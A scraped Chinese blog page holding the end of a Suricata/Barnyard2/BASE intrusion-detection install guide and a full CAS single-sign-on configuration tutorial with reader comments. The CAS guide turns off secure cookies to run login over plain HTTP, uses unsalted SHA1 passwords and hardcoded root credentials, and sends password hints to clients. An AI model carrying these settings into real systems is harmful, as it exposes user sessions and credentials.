<p>需要创建数据库和相应的账号
[root@root ~]$ mysql -uroot –p mysql&gt; create database ids; mysql&gt; grant create,select,update,insert,delete on ids./* to ids@localhost identified by &#39;ids123&#39;;</p>
<p>Barnyard 2安装源文件中的schemas/create_mysql是创建表的sql文件，通过如下方式建表：</p>
<p>[root@root ~]$ mysql -uids -p -Dids &lt; ids/barnyard2-1.9/schemas/create_mysql</p>
<h3 id="-suricata">配置Suricata</h3>
<p>创建Suricata配置目录和日志目录
[root@root ~]$ sudo mkdir /var/log/suricata [root@root ~]$ sudo mkdir /etc/suricata</p>
<p>把规则文件拷贝到Suricata配置目录下</p>
<p>[root@root ids]$ tar zxvf emerging.rules.tar.gz [root@root ids]$ sudo cp -R rules/ /etc/suricata/</p>
<p>把Suricata安装源文件中的</p>
<p>suricata.yaml/classification.config/reference.config
文件拷贝到Suricata的配置目录下</p>
<p>[root@root ids]$ cd suricata-1.1.1 [root@root suricata-1.1.1]$ sudo cp suricata.yaml classification.config reference.config /etc/suricata/</p>
<p>编辑barnyard2.conf文件</p>
<p>[root@root ~]$ cd /etc/suricata/ [root@root suricata]$ sudo vim barnyard2.conf</p>
<p>找到下面的内容</p>
<p>config reference_file:      /etc/snort/reference.config config classification_file: /etc/snort/classification.config config gen_file:            /etc/snort/gen-msg.map config sid_file:                /etc/snort/sid-msg.map</p>
<p>更改为的内容如下：</p>
<p>config reference_file:      /etc/suricata/reference.config config classification_file: /etc/suricata/classification.config config gen_file:            /etc/suricata/rules/gen-msg.map config sid_file:            /etc/suricata/rules/sid-msg.map</p>
<p>同时在文件的末尾添加如下行，红色的mysql数据库、账号信息根据实际情况填写</p>
<p>output database: log, mysql, user=ids password=ids123 dbname=ids host=localhost</p>
<p>编辑suricata.yaml文件</p>
<p>[root@root suricata]$ sudo vim suricata.yaml</p>
<p>找到</p>
<p>HOME_NET: &quot;[192.168.0.0/16,10.0.0.0/8,172.16.0.0/12]&quot;</p>
<p>这一行，根据实际的网络情况来修改，在这里我修改为</p>
<p>HOME_NET: &quot;[192.168.0.0/16]&quot;</p>
<p>找到下面的内容：</p>
<p>host-os-policy:   /# Make the default policy windows.   windows: [0.0.0.0/0]   bsd: []   bsd_right: []   old_linux: []   linux: [10.0.0.0/8, 192.168.1.100, &quot;8762:2352:6241:7245:E000:0000:0000:0000&quot;]   old_solaris: []   solaris: [&quot;::1&quot;]   hpux10: []   hpux11: []   irix: []   macos: []   vista: []   windows2k3: []</p>
<p>根据实际网络情况修改。</p>
<p>启动Suricata、Barnyard 2
[root@root ~]$ sudo /usr/local/bin/barnyard2 -c /etc/suricata/barnyard2.conf -d /var/log/suricata -f unified2.alert -w /var/log/suricata/suricata.waldo -D [root@root ~]$ sudo /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -i eth1 -D</p>
<p>启动suricata的-i参数是镜像流量的网卡。</p>
<p>测试suricata工作是否正常，可以通过如下命令：
[root@root suricata]$ curl www.testmyids.com</p>
<p>执行后，/var/log/suricata目录下的fast.log/suricata.waldo/unified2.alert/*文件大小发生变化，同时查看fast.log文件有如下类似的内容则表示suricata工作正常：</p>
<p>01/12/2012-02:16:27.964981  [/<em>/</em>] [1:2013028:3] ET POLICY curl User-Agent Outbound [/<em>/</em>] [Classification: Attempted Informa tion Leak] [Priority: 2] {TCP} 192.168.230.100:56260 -&gt; 217.160.51.31:80 01/12/2012-02:16:28.309707  [/<em>/</em>] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [/<em>/</em>] [Classification: Potential ly Bad Traffic] [Priority: 2] {TCP} 217.160.51.31:80 -&gt; 192.168.230.100:56260</p>
<h2 id="0x05-base">0x05 配置Base</h2>
<p>Base需要用到adodb以及Image_Canvas、Image_Graph绘图组件，配置过程如下：</p>
<p>解压adodb514.zip
[root@root ids]$ unzip adodb514.zip</p>
<p>把adodb5拷贝到/usr/local/lib/目录下，这个目录随意指定，记下来后面要用到</p>
<p>[root@root ids]$ sudo cp -R adodb5 /usr/local/lib/</p>
<p>安装Image_Canvas、Image_Graph</p>
<p>[root@root ids]$ sudo pear install Image_Canvas-0.3.3.tgz [root@root ids]$ sudo pear install Image_Graph-0.8.0.tgz</p>
<p>解压base-1.4.5.tar.gz</p>
<p>[root@root ids]$ tar zxvf base-1.4.5.tar.gz</p>
<p>拷贝base-1.4.5到/var/www/html目录下</p>
<p>[root@root ids]$ sudo cp -R base-1.4.5 /var/www/html/base</p>
<p>更改/var/www/html/base的属主为apache</p>
<p>[root@root ids]$ cd /var/www/html/ [root@root html]$ sudo chown -R apache:apache base</p>
<p>然后通过浏览器访问<a href="http://192.168.230.100/base" target="_blank">http://192.168.230.100/base</a></p>
<p>￼<img src="" alt="enter image description here"></p>
<p>根据页面中红色的部分提示来进行操作。</p>
<p>修改php.ini
[root@root html]$ sudo vim /etc/php.ini</p>
<p>找到</p>
<p>error_reporting = E_ALL &amp; ~E_DEPRECATED</p>
<p>内容，修改为如下：</p>
<p>error_reporting = E_ALL &amp; ~E_DEPRECATED &amp; ~E_NOTICE</p>
<p>重新载入apache配置</p>
<p>[root@root html]$ sudo /etc/init.d/httpd reload</p>
<p>然后点击“Continue”到下一步 ￼ <img src="" alt="enter image description here"></p>
<p>选择语言，和前面我们的adodb5的路径，然后点击“Continue” ￼ <img src="" alt="enter image description here"></p>
<p>填写mysql相关信息，点击“Continue”继续 ￼ <img src="" alt="enter image description here"></p>
<p>填写认证的相关信息，如果需要验证身份，请勾上“Use Authentication System”,点击“Continue” ￼ <img src="" alt="enter link description here"></p>
<p>点击“Create BASE AG” ￼ <img src="" alt="enter image description here"></p>
<p>点击“step 5”，跳到首页。</p>
<p><img src="" alt="enter image description here"> ￼</p>
<h2 id="0x06-">0x06 最后</h2>
<p>以上是整个安装过程，IDS的价值在于规则设置的是否合适，根据实际情况设置合适的规则才能够体现IDS的强大。规则的设置见以后的文章。
<strong>Tags:</strong> <a href="http://drops.wooyun.org/tag/入侵" target="_blank">入侵</a>, <a href="http://drops.wooyun.org/tag/检测" target="_blank">检测</a></p>
<p>版权声明：未经授权禁止转载 <a href="http://drops.wooyun.org/author/五道口杀气" title="由 五道口杀气 发布" target="_blank">五道口杀气</a>@<a href="http://drops.wooyun.org/" target="_blank">乌云知识库</a>
分享到： <a href="&quot;分享到QQ空间&quot;"></a> <a href="&quot;分享到新浪微博&quot;"></a> <a href="&quot;分享到腾讯微博&quot;"></a> <a href="&quot;分享到人人网&quot;"></a> <a href="&quot;分享到网易微博&quot;"></a> <a href="&quot;累计分享0次&quot;">0</a></p>
<h3 id="-">相关日志</h3>
<ul>
<li><a href="http://drops.wooyun.org/papers/653" target="_blank">搭建基于Suricata+Barnyard2+Base的IDS前端Snorby</a></li>
<li><a href="http://drops.wooyun.org/tips/636" target="_blank">OSSEC 学习教程一</a></li>
<li><a href="http://drops.wooyun.org/tools/515" target="_blank">Zmap详细用户手册和DDOS的可行性</a></li>
<li><a href="http://drops.wooyun.org/papers/660" target="_blank">php4fun.sinaapp.com PHP挑战通关攻略</a></li>
<li><a href="http://drops.wooyun.org/papers/161" target="_blank">Rsync安全配置</a></li>
<li><a href="http://drops.wooyun.org/tips/401" target="_blank">sqlmap用户手册[续]</a>
上一篇:<a href="http://drops.wooyun.org/tips/411" target="_blank">各种环境下的渗透测试</a></li>
</ul>
<p>下一篇:<a href="http://drops.wooyun.org/tips/409" target="_blank">snmp弱口令引起的信息泄漏</a></p>
<h3 id="-5-rss-2-0-http-drops-wooyun-org-tips-413-feed-trackback-http-drops-wooyun-org-tips-413-trackback-">楼被抢了 5 层了... <a href="">抢座</a>、<a href="http://drops.wooyun.org/tips/413/feed" target="_blank">Rss 2.0</a>或者 <a href="http://drops.wooyun.org/tips/413/trackback" target="_blank">Trackback</a></h3>
<ul>
<li><img src="" alt=""> Demon | 2013/08/05 23:03 | <a href="">/#</a></li>
</ul>
<p>学习了</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> lion(lp) | 2013/08/06 09:38 | <a href="">/#</a></li>
</ul>
<p>不错啊</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> Hxai11 | 2013/08/07 09:24 | <a href="">/#</a></li>
</ul>
<p>这篇文章我转载了，挺好的。</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 噬魂 | 2013/08/23 12:07 | <a href="">/#</a></li>
</ul>
<p>挺好的，。看了看</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 0x334 | 2013/10/17 23:23 | <a href="">/#</a></li>
</ul>
<p>额，<a href="http://blog.csdn.net/zhulinu/article/details/7699439" target="_blank">http://blog.csdn.net/zhulinu/article/details/7699439</a>
同学，你是zhulinu？</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<h3 id="-">发表评论</h3>
<p><a href="">点击这里取消回复。</a></p>
<p>您必须 <a href="http://drops.wooyun.org/login" target="_blank">登陆</a> 后才能发表评论。</p>
<h3 id="-">订阅更新</h3>
<ul>
<li><a href="http://drops.wooyun.org/feed" title="点击订阅" target="_blank"><img src="" alt=""></a></li>
</ul>
<h3 id="-">分类</h3>
<ul>
<li><a href="http://drops.wooyun.org/category/papers" title="漏洞分析" target="_blank">漏洞分析</a> (40)</li>
<li><a href="http://drops.wooyun.org/category/tips" title="技术分享" target="_blank">技术分享</a> (57)</li>
<li><a href="http://drops.wooyun.org/category/tools" title="工具收集" target="_blank">工具收集</a> (5)</li>
<li><p><a href="http://drops.wooyun.org/category/news" title="业界资讯" target="_blank">业界资讯</a> (3)</p>
<h3 id="-">最新日志</h3>
</li>
<li><p><a href="http://drops.wooyun.org/tips/688" title="Flash CSRF" target="_blank">Flash CSRF</a></p>
</li>
<li><a href="http://drops.wooyun.org/tips/689" title="XSS与字符编码的那些事儿 —科普文" target="_blank">XSS与字符编码的那些事儿 —科普文</a></li>
<li><a href="http://drops.wooyun.org/papers/680" title="Zabbix SQL Injection/RCE – CVE-2013-5743" target="_blank">Zabbix SQL Injection/RCE – CVE-2013-5743</a></li>
<li><a href="http://drops.wooyun.org/papers/679" title="CDN流量放大攻击思路" target="_blank">CDN流量放大攻击思路</a></li>
<li><a href="http://drops.wooyun.org/news/674" title="从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集" target="_blank">从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集</a></li>
<li><a href="http://drops.wooyun.org/tips/662" title="攻击JavaWeb应用[8]-后门篇" target="_blank">攻击JavaWeb应用[8]-后门篇</a></li>
<li><a href="http://drops.wooyun.org/papers/660" title="php4fun.sinaapp.com PHP挑战通关攻略" target="_blank">php4fun.sinaapp.com PHP挑战通关攻略</a></li>
<li><a href="http://drops.wooyun.org/papers/653" title="搭建基于Suricata+Barnyard2+Base的IDS前端Snorby" target="_blank">搭建基于Suricata+Barnyard2+Base的IDS前端Snorby</a></li>
<li><a href="http://drops.wooyun.org/tools/655" title="GPU破解神器Hashcat使用简介" target="_blank">GPU破解神器Hashcat使用简介</a></li>
<li><a href="http://drops.wooyun.org/tips/649" title="内网渗透应用 跨vlan渗透的一种思路" target="_blank">内网渗透应用 跨vlan渗透的一种思路</a></li>
</ul>
<h3 id="-">最新评论</h3>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>c2y2 在 <a href="http://drops.wooyun.org/tips/689#comment-1883" target="_blank">XSS与字符编码的那些事儿 ---科普文</a>
谢谢</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>Evi1c0de 在 <a href="http://drops.wooyun.org/tips/573#comment-1877" target="_blank">如何用意念获取附近美女的手机号码</a>
连接CMCC跳转到登陆页面 右键源码 修改即可</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>牛牛 在 <a href="http://drops.wooyun.org/tips/688#comment-1871" target="_blank">Flash CSRF</a>
支持一下呵呵</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>luwikes 在 <a href="http://drops.wooyun.org/papers/178#comment-1870" target="_blank">JBoss安全问题总结</a>
mark</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>NgInx 在 <a href="http://drops.wooyun.org/tips/688#comment-1869" target="_blank">Flash CSRF</a>
好吧，基佬，顶你一个，不错。</p>
<ul>
<li><a href="">下一页 »</a>
Powered by <a href="http://wordpress.org/" target="_blank">WordPress</a> | GZai Theme by <a href="http://huaidan.org/" title="GZai Theme produced by 鬼仔" target="_blank">鬼仔</a>
<a href="http://tongji.baidu.com/hm-web/welcome/ico?s=9fc41da6a2322bdd80563c9d5a4bdb1d" target="_blank"><img src="" alt=""></a></li>
</ul>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/入侵检测/">入侵检测</a></li></span></span> | <span class="tags">Tagged <a href="/tags/入侵检测/" class="label label-primary">入侵检测</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-入侵检测--CentOS62下安装基于SuricataBarnyard2Base的⼊侵检测系/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-入侵检测--CentOS62下安装基于SuricataBarnyard2Base的⼊侵检测系" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-CAS--cas配置全攻略-哈哈-吼吼-这是个好地方-BlogJava/">cas配置全攻略 </a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-CAS--cas配置全攻略-哈哈-吼吼-这是个好地方-BlogJava/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="cas-blogjava">cas配置全攻略 - 哈哈,吼吼,这是个好地方 - BlogJava</h1>
<p><a href="http://www.blogjava.net/tufanshu/" target="_blank">哈哈,吼吼,这是个好地方</a>
没有风雨躲的过， 没有坎坷不必走……</p>
<p><a href="http://www.blogjava.net/" target="_blank">BlogJava</a>    <a href="http://www.blogjava.net/tufanshu/" target="_blank">首页</a>    <a href="http://www.blogjava.net/tufanshu/admin/EditPosts.aspx?opt=1" target="_blank">新随笔</a>    <a href="http://www.blogjava.net/tufanshu/contact.aspx?id=1" target="_blank">联系</a>    <a href="http://www.blogjava.net/tufanshu/rss" target="_blank">聚合</a><a href="http://www.blogjava.net/tufanshu/rss" target="_blank"><img src="" alt=""></a>    <a href="http://www.blogjava.net/tufanshu/admin/EditPosts.aspx" target="_blank">管理</a></p>
<p>posts - 37,  comments - 50,  trackbacks - 0</p>
<p><a href="">cas配置全攻略</a></p>
<p>经过将近两天的测试，参考众多网友的贡献，终于完成了对cas的主要配置和测试，现记录如下</p>
<p>基本需求：</p>
<p>1.cas server-3.4.5,casclient-3.2（官方版本），均可在cas官方网站下载，<a href="http://www.jasig.org/" target="_blank"><a href="http://www.jasig.org">http://www.jasig.org</a></a></p>
<p>2.使用低成本的http协议进行传输，俺买不起ssl证书</p>
<p>3.通过jdbc进行用户验证</p>
<p>4.需要通过casserver提供除登录用户名以外的附加信息</p>
<p>参考资料：</p>
<p>1.cas官方网站的用户帮助手册和wiki</p>
<p>2.网友“城市猎人”的blog，<a href="http://yuzhwe.javaeye.com/blog/830143" target="_blank"><a href="http://yuzhwe.javaeye.com/blog/830143">http://yuzhwe.javaeye.com/blog/830143</a></a></p>
<p>3.网友“悟空悟道”的blog，<a href="http://llhdf.javaeye.com/blog/764385" target="_blank"><a href="http://llhdf.javaeye.com/blog/764385">http://llhdf.javaeye.com/blog/764385</a></a></p>
<p>4.其他网友贡献的相关的blog，都是通过google出来，就不一一列出了，一并致谢！！！</p>
<p>好了，下面进入正题，如果您不想测试中出现异常情况，或是获取不到相关数据，请关注文中的红色字体部分。</p>
<p>（1）使用http协议的设置，如果您也像我一样，买不起ssl数字证书，对安全的要求也不是特别的搞，下面的配置就可以帮助解决这个问题：</p>
<p>在cas-server-webapp中的/WEB-INF/spring-configuration/ticketGrantingTicketCookieGenerator.xml文件中有如下配置</p>
<bean id="ticketGrantingTicketCookieGenerator" class="org.jasig.cas.web.support.CookieRetrievingCookieGenerator"
  p:cookieSecure="true"     //默认为true，使用https,如果只需要http，修改为false即可
  p:cookieMaxAge="-1"
  p:cookieName="CASTGC"
  p:cookiePath="/cas" />

 （2）使用jdbc数据源进行用户认证，需要修改cas的authenticationHandlers方式，在文件/WEB-INF/deployerConfigContext.xml有如下配置：

<property name="authenticationHandlers">
   <list>
    <!--
     | This is the authentication handler that authenticates services by means of callback via SSL, thereby validating
     | a server side SSL certificate.
     +-->
    <bean class="org.jasig.cas.authentication.handler.support.HttpBasedServiceCredentialsAuthenticationHandler"
     p:httpClient-ref="httpClient" />
    <!--
     | This is the authentication handler declaration that every CAS deployer will need to change before deploying CAS
     | into production.  The default SimpleTestUsernamePasswordAuthenticationHandler authenticates UsernamePasswordCredentials
     | where the username equals the password.  You will need to replace this with an AuthenticationHandler that implements your
     | local authentication strategy.  You might accomplish this by coding a new such handler and declaring
     | edu.someschool.its.cas.MySpecialHandler here, or you might use one of the handlers provided in the adaptors modules.
     +-->
    <!--<bean class="org.jasig.cas.authentication.handler.support.SimpleTestUsernamePasswordAuthenticationHandler" />-->
     <bean  class="org.jasig.cas.adaptors.jdbc.QueryDatabaseAuthenticationHandler">
         <property name="dataSource" ref="dataSource" />
        <property name="sql" value="select password from userInfo where username=? and enabled=true" />
         //用户密码编码方式
         <property name="passwordEncoder"
           ref="passwordEncoderBean"/>
         </bean><br>   </list>
  </property>

该属性中的list只要用一个认证通过即可，建议将红色部分放在第一位，如果确认只用jdbc一种方式，其他认证方式均可删除。另外需要在在文件中添加datasoure和passordEncoder两个bean，如下

<!-- Data source definition -->
 <bean id="dataSource" class="org.springframework.jdbc.datasource.DriverManagerDataSource">
  <property name="driverClassName">
    <value>com.mysql.jdbc.Driver</value>
  </property>
  <property name="url">
    <value>jdbc:mysql://localhost:3306/test?useUnicode=true&amp;characterEncoding=utf-8</value>    //如果使用mysql数据库，应该加上后面的编码参数，否则可能导致客户端对TGT票据无法识别的问题
  </property>
  <property name="username"><value>root</value></property>
  <property name="password"><value>password</value></property>
 </bean>
 <bean id="passwordEncoderBean" class="org.jasig.cas.authentication.handler.DefaultPasswordEncoder">
        <constructor-arg value="SHA1" />  //cas
server默认支持MD5和SHA1两种编码方式，如果需要其他的编码方式例如SHA256,512等，可自行实现org.jasig.cas.authentication.handler.PasswordEncoder接口
    </bean>

<p>附加备注：如果您是使用cas server的源码自行编译的话，需要在cas-server-web模块的pom.xml中添加如下模块的依赖：</p>
<dependency>
       <groupId>${project.groupId}</groupId>
       <artifactId>cas-server-support-jdbc</artifactId>
       <version>${project.version}</version>
  </dependency>  

<p>并添加对应数据库的jdbc的jar包。</p>
<p>（3）让cas server提供更多的用户数据共客户端使用</p>
<p>通过测试，由于cas的代码更新过程中的变化较大，所以包兼容的问题好像一直存在，在测试中我就碰到过，花费时间比较多，建议同学们在使用过程中使用官方的最新的发布版本。在我使用的这个版本中，请参考前面的关于server和client端的版本说明，应该没有包冲突的问题，测试通过。下面进行配置，配置文件：/WEB-INF/deployerConfigContext.xml</p>
<p><property name="credentialsToPrincipalResolvers">
   <list>
       <!--<bean class="org.jasig.cas.authentication.principal.UsernamePasswordCredentialsToPrincipalResolver" />-->
    <!-- modify on 2011-01-18,add user info -->
    <bean class="org.jasig.cas.authentication.principal.UsernamePasswordCredentialsToPrincipalResolver" >
      <property name="attributeRepository" >   //为认证过的用户的Principal添加属性
      <ref local="attributeRepository"/>
     </property> 
    </bean>
      <bean
     class="org.jasig.cas.authentication.principal.HttpBasedServiceCredentialsToPrincipalResolver" />
   </list>
  </property>
 修改该文件中默认的 attributeRepositorybean配置
<!-- 在这里配置获取更多用户的信息 -->
 <bean id="attributeRepository" class="org.jasig.services.persondir.support.jdbc.SingleRowJdbcPersonAttributeDao">
  <constructor-arg index="0" ref="dataSource" />
  <constructor-arg index="1" value="select id as UId, password_hint as ph from userInfo where username=? and enabled=true" />
  <property name="queryAttributeMapping">
   <map>
   <entry key="username" value="uid"/><!-- 这里必须这么写，系统会自己匹配，貌似和where语句后面的用户名字段的拼写没有什么关系 -->
   </map>
  </property>
   <!-- 要获取的属性在这里配置 -->
  <property name="resultAttributeMapping">
   <map>
   <entry key="UId" value="userId" /> //key为对应的数据库字段名称，value为提供给客户端获取的属性名字，系统会自动填充值
   <entry key="ph" value="passwordHint" /><br>   </map>
  </property>
</bean> 
备注：网上有很多的关于这个的配置，但是如果您使用的是我提供的版本或是高于这个版本，就应该象上面这样配置，无用质疑，网上大部分的配置都是基于
person-directory-impl,person-directory-api
1.1左右的版本，而最新的cas使用的是1.5的版本，经过查看源代码和api docs确定最新版本的属性参数如上配置。</p>
<p>修改该xml文件中最后一个默认的serviceRegistryDao bean中的属性全部注释掉，或者删除，
这个bean中的RegisteredServiceImpl的ignoreAttributes属性将决定是否添加attributes属性内容，默认为false:不添加，只有去掉这个配置，
cas server才会将获取的用户的附加属性添加到认证用的Principal的attributes中去，我在这里犯过这样的错误，最后还是通过跟踪源码才发现的。</p>
<bean
  id="serviceRegistryDao"
        class="org.jasig.cas.services.InMemoryServiceRegistryDaoImpl">
        &lt;!--
            <property name="registeredServices">
                <list>
                    <bean class="org.jasig.cas.services.RegisteredServiceImpl">
                        <property name="id" value="0" />
                        <property name="name" value="HTTP" />
                        <property name="description" value="Only Allows HTTP Urls" />
                        <property name="serviceId" value="http:///*/*" />
                    </bean>

<pre><code>                &lt;bean class=&quot;org.jasig.cas.services.RegisteredServiceImpl&quot;&gt;
                    &lt;property name=&quot;id&quot; value=&quot;1&quot; /&gt;
                    &lt;property name=&quot;name&quot; value=&quot;HTTPS&quot; /&gt;
                    &lt;property name=&quot;description&quot; value=&quot;Only Allows HTTPS Urls&quot; /&gt;
                    &lt;property name=&quot;serviceId&quot; value=&quot;https:///*/*&quot; /&gt;
                &lt;/bean&gt;

                &lt;bean class=&quot;org.jasig.cas.services.RegisteredServiceImpl&quot;&gt;
                    &lt;property name=&quot;id&quot; value=&quot;2&quot; /&gt;
                    &lt;property name=&quot;name&quot; value=&quot;IMAPS&quot; /&gt;
                    &lt;property name=&quot;description&quot; value=&quot;Only Allows HTTPS Urls&quot; /&gt;
                    &lt;property name=&quot;serviceId&quot; value=&quot;imaps:///*/*&quot; /&gt;
                &lt;/bean&gt;

                &lt;bean class=&quot;org.jasig.cas.services.RegisteredServiceImpl&quot;&gt;
                    &lt;property name=&quot;id&quot; value=&quot;3&quot; /&gt;
                    &lt;property name=&quot;name&quot; value=&quot;IMAP&quot; /&gt;
                    &lt;property name=&quot;description&quot; value=&quot;Only Allows IMAP Urls&quot; /&gt;
                    &lt;property name=&quot;serviceId&quot; value=&quot;imap:///*/*&quot; /&gt;
                &lt;/bean&gt;
            &lt;/list&gt;
        &lt;/property&gt;--&gt;
       &lt;/bean&gt;
</code></pre><p> 修改WEB-INF\view\jsp\protocol\2.0\casServiceValidationSuccess.jsp文件，如下：</p>
<p>&lt;%@ page session=&quot;false&quot;%&gt;
&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;<a href="http://java.sun.com/jsp/jstl/core%22%" target="_blank"><a href="http://java.sun.com/jsp/jstl/core&quot;%">http://java.sun.com/jsp/jstl/core&quot;%</a></a>&gt;
&lt;%@ taglib uri=&quot;<a href="http://java.sun.com/jsp/jstl/functions" target="_blank"><a href="http://java.sun.com/jsp/jstl/functions">http://java.sun.com/jsp/jstl/functions</a></a>&quot; prefix=&quot;fn&quot;%&gt;</p>
<p><cas:serviceResponse xmlns:cas='http://www.yale.edu/tp/cas'>
 <cas:authenticationSuccess>
  <cas:user>${fn:escapeXml(assertion.chainedAuthentications[fn:length(assertion.chainedAuthentications)-1].principal.id)}</cas:user>
  <c:if test="${not empty pgtIou}">
   <cas:proxyGrantingTicket>${pgtIou}</cas:proxyGrantingTicket>
  </c:if>
  <c:if test="${fn:length(assertion.chainedAuthentications) > 1}">
   <cas:proxies>
    <c:forEach var="proxy" items="${assertion.chainedAuthentications}"
     varStatus="loopStatus" begin="0"
     end="${fn:length(assertion.chainedAuthentications)-2}" step="1">
     <cas:proxy>${fn:escapeXml(proxy.principal.id)}</cas:proxy>
    </c:forEach>
   </cas:proxies>
  </c:if>
   <c:if
   test="${fn:length(assertion.chainedAuthentications[fn:length(assertion.chainedAuthentications)-1].principal.attributes)
>
0}">
   <cas:attributes>
    <c:forEach
var="attr"
     items="${assertion.chainedAuthentications[fn:length(assertion.chainedAuthentications)-1].principal.attributes}"
     varStatus="loopStatus"
begin="0"
     end="${fn:length(assertion.chainedAuthentications[fn:length(assertion.chainedAuthentications)-1].principal.attributes)-1}"
     step="1">
     <cas:${fn:escapeXml(attr.key)}>${fn:escapeXml(attr.value)}</cas:${fn:escapeXml(attr.key)}>
    </c:forEach>
   </cas:attributes>
  </c:if>
 </cas:authenticationSuccess>
</cas:serviceResponse>
客户端配置:
1.过滤器CAS Validation Filter：</p>
<p><filter>
  <filter-name>CAS Validation Filter</filter-name>
  <filter-class> org.jasig.cas.client.validation.Cas20ProxyReceivingTicketValidationFilter</filter-class>
  <init-param>
    <param-name>casServerUrlPrefix</param-name>
    <param-value><a href="http://domainserver:8081/cas" target="_blank">http://domainserver:8081/cas</a></param-value>
  </init-param>
</filter>
在客户端获取信息
AttributePrincipal principal = (AttributePrincipal) request.getUserPrincipal();
String loginName = principal.getName();//获取用户名
Map<String, Object> attributes = principal.getAttributes();
if(attributes != null) {
 System.out.println(attributes.get(&quot;userId&quot;));
 System.out.println(attributes.get(&quot;passwordHint&quot;));
}</p>
<p>posted on 2011-01-21 10:06 <a href="http://www.blogjava.net/tufanshu/" target="_blank">雪地孤鸿</a> 阅读(3704) <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#Post" target="_blank">评论(7)</a>  <a href="http://www.blogjava.net/tufanshu/admin/EditPosts.aspx?postid=343290" target="_blank">编辑</a>  <a href="http://www.blogjava.net/tufanshu/AddToFavorite.aspx?id=343290" target="_blank">收藏</a> 所属分类: <a href="http://www.blogjava.net/tufanshu/category/4974.html" target="_blank">java</a> <img src="" alt=""></p>
<p><a href=""></a>
<strong>FeedBack:</strong></p>
<p><a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#343395" title="permalink: re: cas配置全攻略" target="_blank">/#</a> <a href=""></a>re: cas配置全攻略</p>
<p>2011-01-23 13:13 | <a href="">来如风</a>
非常好，我上周也配置成功
只是最后过滤器有疑问</p>
<p><init-param></p>
<p><param-name>casServerUrlPrefix</param-name></p>
<p><param-value><a href="http://domainserver:8081/cas%3C/param-value%3E" target="_blank"><a href="http://domainserver:8081/cas">http://domainserver:8081/cas</a></param-value></a>
</init-param>
我是集成了spring security 的配置，貌似这些不在过滤其中配置，在bean文件中有  <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#post" target="_blank">回复</a>  <a href="http://www.blogjava.net/comment?author=%e6%9d%a5%e5%a6%82%e9%a3%8e" title="查看该作者发表过的评论" target="_blank">更多评论</a>
<a href=""></a>  <a href=""></a>
<a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#343442" title="permalink: re: cas配置全攻略" target="_blank">/#</a> <a href=""></a>re: cas配置全攻略</p>
<p>2011-01-24 16:29 | <a href="">coolszy</a>
你好，按照你的配置，但是
Map<String, Object> attributes = principal.getAttributes();
还是得到空值，不知道什么原因  <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#post" target="_blank">回复</a>  <a href="http://www.blogjava.net/comment?author=coolszy" title="查看该作者发表过的评论" target="_blank">更多评论</a>
<a href=""></a>  <a href=""></a></p>
<p><a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#343924" title="permalink: re: cas配置全攻略[未登录]" target="_blank">/#</a> <a href=""></a>re: cas配置全攻略[未登录]</p>
<p>2011-02-07 11:02 | <a href="">mcikeay</a></p>
<p><entry key="username" value="uid"/><!-- 这里必须这么写，系统会自己匹配，貌似和where语句后面的用户名字段的拼写没有什么关系 -->
cas 会自己组装<map>节点中的key-value, 节点间默认是 and 连接  <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#post" target="_blank">回复</a>  <a href="http://www.blogjava.net/comment?author=mcikeay" title="查看该作者发表过的评论" target="_blank">更多评论</a>
<a href=""></a>  <a href=""></a>
<a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#344268" title="permalink: re: cas配置全攻略" target="_blank">/#</a> <a href=""></a>re: cas配置全攻略</p>
<p>2011-02-14 15:15 | <a href="http://040922/" target="_blank">tufanshu</a>
@coolszy
请检查cas client的版本是否正确  <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#post" target="_blank">回复</a>  <a href="http://www.blogjava.net/comment?author=tufanshu" title="查看该作者发表过的评论" target="_blank">更多评论</a>
<a href=""></a>  <a href=""></a></p>
<p><a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#347172" title="permalink: re: cas配置全攻略" target="_blank">/#</a> <a href=""></a>re: cas配置全攻略</p>
<p>2011-03-29 10:45 | <a href="">wuximin</a>
